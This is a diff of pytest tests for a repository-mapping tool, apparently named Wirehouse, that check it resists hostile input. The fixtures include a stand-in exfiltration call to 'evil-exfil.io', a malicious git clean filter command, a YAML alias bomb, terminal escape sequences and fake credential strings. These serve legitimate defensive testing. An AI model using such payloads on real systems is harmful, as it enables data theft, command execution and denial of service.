@@ -771,6 +771,46 @@ def test_long_files_scan_quickly():
     assert "y" in {i[0] for i in facts.imports}
 
 
+@pytest.mark.parametrize(("rel", "lang", "unit"), [
+    ("Doc.cs", "csharp", "///\n"), ("Doc.cs", "csharp", " "), ("doc.go", "go", "//\n"), ("imports.go", "go", "import (\n"),
+    ("routes.py", "python", "r = APIRouter("), ("words.py", "python", "a_"), ("entity.ts", "typescript", "@Entity("),
+    ("schema.sql", "sql", "CREATE TABLE "), ("models.ts", "typescript", "@Column() "),
+])
+def test_hostile_patterns_scan_in_linear_time(rel, lang, unit):
+    # Each of these took from 30 seconds to minutes on one file before the patterns were bounded.
+    import time
+
+    from wirehouse.detectors.code import analyze
+    from wirehouse.scan import MAX_FILE_BYTES, SourceFile
+
+    text = ("@Entity()\nclass A {\n" if unit.startswith("@Column") else "") + unit * (MAX_FILE_BYTES // len(unit) // 2)
+    sf = SourceFile(rel=rel, lang=lang, size=len(text), text=text, sha="0", lines=text.count("\n") + 1)
+    t0 = time.perf_counter()
+    analyze(sf)
+    assert time.perf_counter() - t0 < 5
+
+
+def test_go_require_blocks_with_blank_runs_parse_quickly():
+    import time
+
+    from wirehouse.detectors.units import _GO_REQUIRE
+
+    t0 = time.perf_counter()
+    assert not list(_GO_REQUIRE.finditer("\n" * 200_000))
+    assert time.perf_counter() - t0 < 5
+    assert [m.group(1) for m in _GO_REQUIRE.finditer("require (\n\n\tgithub.com/a/b v1.0.0\n)\n")] == ["github.com/a/b"]
+
+
+def test_doc_comments_are_still_read():
+    from wirehouse.detectors.code import _cs_doc, _go_doc
+
+    cs = "using X;\n\n/// <summary>Charges <b>cards</b>.</summary>\n///\tSecond line.\n[ApiController]\n[Route(\"x\")]\npublic class Pay {}\n"
+    assert _cs_doc(cs) == "Charges cards. Second line."
+    assert _cs_doc("/// lonely\n\npublic class A {}\n") == ""
+    assert _go_doc("// Package pay charges cards.\n//\n// More.\npackage pay\n") == "Package pay charges cards."
+    assert _go_doc("// Copyright 2024 Acme\npackage pay\n") == "" and _go_doc("// stray\n\npackage pay\n") == ""
+
+
 def test_public_api_urls_and_cors_strings_still_connect(tmp_path):
     _write(tmp_path, {
         "docker-compose.yml": """
@@ -1056,3 +1096,192 @@ def test_against_needs_a_real_map(repo, tmp_path):
     bad.write_text('{"not": "a map"}', encoding="utf-8")
     with pytest.raises(SystemExit, match="not a Wirehouse map"):
         main(["build", str(repo), "-o", str(tmp_path / "out"), "--against", str(bad)])
+
+
+# (text, the secret part). Built from pieces so this file never holds a string that looks like a live credential.
+TOKEN_FORMATS = [(t, t) for t in (
+    "gh" + "o_" + "a1B2" * 9, "gh" + "s_" + "c3D4" * 9, "gh" + "u_" + "e5F6" * 9, "gh" + "r_" + "g7H8" * 9,
+    "AS" + "IA" + "QWERTYUIOPASDFGH", "eyJ" + "hbGciOiJIUzI1NiJ9.eyJ" + "zdWIiOiIxMjM0In0.c2lnbmF0dXJl",
+    "sk-" + "Abc123def456ghi789jkl012", "sk-" + "proj-" + "Abc123def456ghi789jkl012", "sk-" + "ant-" + "api03-Abc123def456ghi789",
+    "AI" + "za" + "SyA1234567890abcdefghijklmnopqrstuv", "glp" + "at-" + "abcdefghij1234567890", "np" + "m_" + "Ab1" * 12,
+    "S" + "G." + "a" * 22 + "." + "b" * 43, "h" + "f_" + "Ab1" * 11, "S" + "K" + "0123456789abcdef" * 2,
+    "https://hooks.slack.com/" + "services/T0000/B0000/XXXXXXXX", "https://discord.com/api/" + "webhooks/1234/abc-DEF_123",
+)] + [(prefix + secret, secret) for prefix, secret in (
+    ("aws_secret_access_key = ", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
+    ("DefaultEndpointsProtocol=https;AccountName=acme;AccountKey=", "abc123DEF456ghi789=="),
+    ("Endpoint=sb://acme.servicebus.windows.net/;SharedAccessKey=", "abc123DEF456="),
+    ("https://acme.blob.core.windows.net/c?sv=2022-11-02&sig=", "abcdEFGH1234%2Bxyz"),
+    ("Authorization: Bearer ", "abc123def456ghi789"), ("Authorization: Basic ", "dXNlcjpwYXNzd29yZA=="),
+    ('"password": "', "hunter2xyz"), ("DB_PASSWORD=", "hunter2xyz"), ("client_secret=", "abcd1234wxyz"),
+)]
+
+
+@pytest.mark.parametrize(("text", "secret"), TOKEN_FORMATS)
+def test_common_credential_formats_are_redacted(text, secret):
+    from wirehouse.redact import scrub
+
+    out, hits = scrub({"doc": f"Setup notes: {text} (do not share)"})
+    assert hits == 1 and "[redacted]" in out["doc"] and secret not in out["doc"]
+    assert out["doc"].startswith("Setup notes: ")
+
+
+@pytest.mark.parametrize("text", ["Basic authentication is used", "Bearer token in the header", "sk-loading-spinner-container",
+                                  "secret_manager.get(name)", "see DB_PASSWORD in the vault"])
+def test_ordinary_text_is_not_redacted(text):
+    from wirehouse.redact import scrub
+
+    assert scrub({"doc": text}) == ({"doc": text}, 0)
+
+
+@pytest.mark.parametrize(("text", "kept"), [
+    ("C:\\Users\\alice\\code\\x.py", "~\\code\\x.py"), ("C:/Users/alice/code", "~/code"),
+    ("C:\\Documents and Settings\\alice\\x", "~\\x"), ("at /Users/alice/code", "at ~/code"), ('"/home/alice/x"', '"~/x"'),
+    ("/mnt/c/Users/alice/x", "~/x"), ("/c/Users/alice/x", "~/x"), ("cwd=/var/home/alice/x", "cwd=~/x"),
+    ("/export/home/alice", "~"), ("/root/x.py", "~/x.py"), ("`/home/alice/y.py` is missing", "`~/y.py` is missing"),
+])
+def test_share_cuts_home_folders(text, kept):
+    from wirehouse.redact import scrub
+
+    assert scrub({"doc": text}, share=True)[0]["doc"] == kept
+
+
+def test_share_keeps_api_routes(tmp_path):
+    # Routes under /users and /home are URLs, not home folders: --share must leave them as written.
+    from wirehouse.cli import main
+
+    _write(tmp_path, {
+        "api/requirements.txt": "fastapi\n",
+        "api/main.py": """
+            from fastapi import FastAPI
+            app = FastAPI()
+
+            @app.get("/users/{id}")
+            def user(id: int):
+                return {}
+
+            @app.get("/home/dashboard")
+            def dashboard():
+                return {}
+        """,
+    })
+    out = tmp_path / "out"
+    assert main(["build", str(tmp_path), "-o", str(out), "--share"]) == 0
+    data = json.loads((out / "archmap.json").read_text(encoding="utf-8"))
+    eps = {e["path"] for n in data["nodes"] for e in n.get("endpoints", [])}
+    assert {"/users/{id}", "/home/dashboard"} <= eps
+    quests = json.dumps(data["quests"])
+    assert "GET /home/dashboard" in quests and "~" not in quests   # the route in narrated text survives too
+
+
+def test_enrichment_shipped_with_the_repo_is_flagged(tmp_path, capsys):
+    # A cloned repository can carry its own enrichment.json that hides a block. It is still applied,
+    # but the run warns loudly and every removal is listed in the Checks panel.
+    import shutil
+    import subprocess
+
+    if not shutil.which("git"):
+        pytest.skip("git not installed")
+    from wirehouse.cli import main
+
+    _write(tmp_path, {
+        "app/requirements.txt": "httpx\n",
+        "app/sync.py": 'import httpx\nhttpx.post("https://evil-exfil.io/upload", json={})\n',
+        "wirehouse-out/enrichment.json": json.dumps({"remove_nodes": ["ext:evil-exfil.io"]}),
+    })
+    run = lambda *a: subprocess.run(["git", "-C", str(tmp_path), *a], check=True, capture_output=True)  # noqa: E731
+    run("init", "-q")
+    run("add", "-A", "-f")
+    assert main(["build", str(tmp_path)]) == 0
+    printed = capsys.readouterr().out
+    assert "WARNING" in printed and "checked into the repository" in printed
+    data = json.loads((tmp_path / "wirehouse-out" / "archmap.json").read_text(encoding="utf-8"))
+    assert "ext:evil-exfil.io" not in {n["id"] for n in data["nodes"]}          # still applied
+    codes = {(d["code"], d["subject"]) for d in data["diagnostics"]}
+    assert ("enrichment/removed-node", "remove_nodes ext:evil-exfil.io") in codes
+    assert ("enrichment/from-repository", "enrichment.json") in codes
+
+
+def test_removed_connections_are_listed_in_the_checks(archmap):
+    data = merge(json.loads(json.dumps(archmap)), {"remove_edges": [{"source": "unit:js:web", "target": "unit:python:api"}]})
+    hits = [d for d in data["diagnostics"] if d["code"] == "enrichment/removed-edge"]
+    assert len(hits) == 1 and hits[0]["subject"] == "remove_edges unit:js:web->unit:python:api"
+    assert hits[0]["severity"] == "warning"
+
+
+def test_scan_never_runs_filters_from_the_repos_own_git_config(tmp_path):
+    # `git status` runs clean filters, and a .git folder from an archive can name any command in them.
+    import shutil
+    import subprocess
+
+    from wirehouse import repo
+
+    if not shutil.which("git"):
+        pytest.skip("git not installed")
+    _write(tmp_path, {"a.txt": "x\n", ".gitattributes": "* filter=evil\n"})
+    run = lambda *a: subprocess.run(["git", "-C", str(tmp_path), *a], check=True, capture_output=True)  # noqa: E731
+    run("init", "-q")
+    run("-c", "user.name=t", "-c", "user.email=t@example.com", "add", "-A")
+    run("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "init")
+    run("config", "filter.evil.clean", "touch PWNED; cat")
+    (tmp_path / "a.txt").write_text("changed\n", encoding="utf-8")
+    info = repo.repo_info(tmp_path)
+    assert not (tmp_path / "PWNED").exists()
+    assert info["dirty"] == [] and info["dirty_complete"] is False   # the page then says links may show older code
+
+
+def test_scan_stays_inside_the_project(tmp_path):
+    # Links can lead anywhere on the machine and a pipe never ends: neither may be read.
+    import os
+
+    from wirehouse.scan import MAX_FILE_BYTES, scan
+
+    outside, root = tmp_path / "outside", tmp_path / "proj"
+    _write(outside, {"leak.py": "OUTSIDE_SOURCE = 1\n", "package.json": json.dumps({"name": "OUTSIDE_PKG"})})
+    _write(root, {"app/main.py": "x = 1\n", "app/docker-compose.yml": "services:\n  web:\n    image: x\n" + "#" * MAX_FILE_BYTES})
+    try:
+        os.symlink(outside, root / "linked", target_is_directory=True)
+        os.symlink(outside / "package.json", root / "app" / "package.json")
+    except (OSError, NotImplementedError):
+        pytest.skip("this system cannot create symlinks")
+    if hasattr(os, "mkfifo"):
+        os.mkfifo(root / "app" / "pipe.py")
+    res = scan(root)
+    assert [s.rel for s in res.sources] == ["app/main.py"]
+    assert "package_json" not in res.configs
+    assert res.read("app/docker-compose.yml") == ""            # over the size cap: not read at all
+    assert res.read("../outside/package.json") == "" and res.read("linked/package.json") == ""
+
+
+ALIAS_BOMB = "".join(f"x-{c}: &{c} [{', '.join([f'*{p}'] * 9)}]\n" for p, c in zip("abcdefgh", "bcdefghi"))
+ALIAS_BOMB = 'x-a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]\n' + ALIAS_BOMB
+
+
+@pytest.mark.parametrize(("rel", "body"), [
+    ("docker-compose.yml", ALIAS_BOMB + "services:\n  web:\n    image: *i\n    command: *i\n    ports: *i\n"
+                           "    environment: *i\n    labels: *i\n    depends_on: *i\n    build:\n      context: *i\n"),
+    (".github/workflows/ci.yml", ALIAS_BOMB + "name: *i\non: *i\njobs:\n  test:\n    runs-on: ubuntu-latest\n"),
+    ("k8s/deploy.yaml", ALIAS_BOMB + "apiVersion: v1\nkind: *i\nmetadata:\n  name: *i\n"),
+])
+def test_yaml_alias_bombs_do_not_hang_the_scan(tmp_path, rel, body):
+    # Nine levels of nine aliases is 387 million items once turned into text, from a dozen lines.
+    import time
+
+    _write(tmp_path, {rel: body})
+    t0 = time.perf_counter()
+    build_archmap(tmp_path, log=lambda *_: None)
+    assert time.perf_counter() - t0 < 5
+
+
+def test_control_characters_never_reach_the_output(repo, tmp_path, capsys):
+    # Agent-written ids are echoed in diagnostics on the terminal: escape codes must not survive.
+    from wirehouse.cli import main
+
+    out = tmp_path / "out"
+    out.mkdir()
+    (out / "enrichment.json").write_text(json.dumps({
+        "add_edges": [{"source": "\x1b]0;owned\x07unit:js:web", "target": "\x1b[2Jres:x\x9b", "evidence": []}],
+    }), encoding="utf-8")
+    assert main(["build", str(repo), "-o", str(out)]) == 0
+    printed = capsys.readouterr().out
+    assert "\x1b" not in printed and "\x07" not in printed and "\x9b" not in printed
+    assert "\\u001b" not in (out / "archmap.json").read_text(encoding="utf-8")
